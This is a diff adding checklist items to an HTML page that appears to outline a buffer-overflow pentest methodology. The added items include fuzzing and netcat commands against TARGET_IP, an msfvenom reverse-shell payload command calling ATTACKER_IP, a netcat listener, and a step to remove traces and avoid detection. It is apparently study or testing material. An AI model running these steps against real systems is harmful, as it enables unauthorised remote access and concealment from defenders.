@@ -37,6 +37,15 @@
                 <li><input type="checkbox" id="secure-backups"> <label for="secure-backups">Securely store exploit codes and data for legal compliance and future reference.</label></li>
                 <li><input type="checkbox" id="review-legal"> <label for="review-legal">Review legal implications and ensure compliance with all regulations.</label></li>
                 <li><input type="checkbox" id="finalize-report"> <label for="finalize-report">Finalize the report and prepare for submission or presentation.</label></li>
+                <li><input type="checkbox" id="fuzzing"> <label for="fuzzing"><strong>Fuzzing:</strong> Identify potential buffer overflow points using manual fuzzing techniques. (Command: `python fuzz.py TARGET_IP 9999`)</label></li>
+    <li><input type="checkbox" id="crash-replication"> <label for="crash-replication"><strong>Crash Replication:</strong> Replicate the crash to confirm buffer overflow vulnerability. (Command: `nc TARGET_IP 9999 < pattern.txt`)</label></li>
+    <li><input type="checkbox" id="control-eip"> <label for="control-eip"><strong>Controlling EIP:</strong> Use pattern creation to find the EIP offset. (Command: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300`)</label></li>
+    <li><input type="checkbox" id="bad-chars"> <label for="bad-chars"><strong>Identifying Bad Characters:</strong> Verify bad characters that could break the shellcode. (Command: `python badchars.py`)</label></li>
+    <li><input type="checkbox" id="shellcode-generation"> <label for="shellcode-generation"><strong>Shellcode Generation:</strong> Generate shellcode avoiding bad characters. (Command: `msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -b "\\x00" -f c`)</label></li>
+    <li><input type="checkbox" id="overflow-exploit"> <label for="overflow-exploit"><strong>Exploit Development:</strong> Develop the final exploit script to execute the shellcode. (Command: `python exploit.py TARGET_IP 9999`)</label></li>
+    <li><input type="checkbox" id="gaining-access"> <label for="gaining-access"><strong>Gaining Access:</strong> Execute the exploit to gain remote access. (Command: `nc -lvnp 4444`)</label></li>
+    <li><input type="checkbox" id="post-exploitation"> <label for="post-exploitation"><strong>Post-Exploitation:</strong> Perform actions as the authenticated user to explore the system and escalate privileges.</label></li>
+    <li><input type="checkbox" id="cleanup"> <label for="cleanup"><strong>Cleanup:</strong> Remove traces of the exploit to avoid detection. (Command: `cleanup_script.sh`)</label></li>
             </ul>
         </article>
     </main>
